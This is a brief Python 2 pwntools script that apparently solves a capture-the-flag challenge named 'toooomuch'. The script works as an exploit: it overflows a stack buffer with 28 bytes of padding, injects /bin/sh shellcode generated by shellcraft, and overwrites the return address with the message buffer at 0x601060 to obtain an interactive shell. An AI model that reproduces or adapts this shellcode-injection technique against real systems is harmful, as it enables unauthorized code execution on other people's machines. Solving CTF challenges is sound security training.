#!/usr/bin/env python2
from pwn import *
import pwnlib.shellcraft

#init
#c = remote('ackme.inndy.tw', 7702)
c = process('/tmp/toooomuch')

context.os='linux'
context.arch='amd64'
# context.log_level ='debug'
# gdb
context.terminal = ['alacritty', '-e', 'sh', '-c']
gdb.attach(c)

ans = "A" * (24 + 4)
ans += asm(shellcraft.sh()) # put shellcode to message
ans = ans + p64(0x0000000000601060) # return to message
c.sendline(ans)

c.interactive()
c.close()
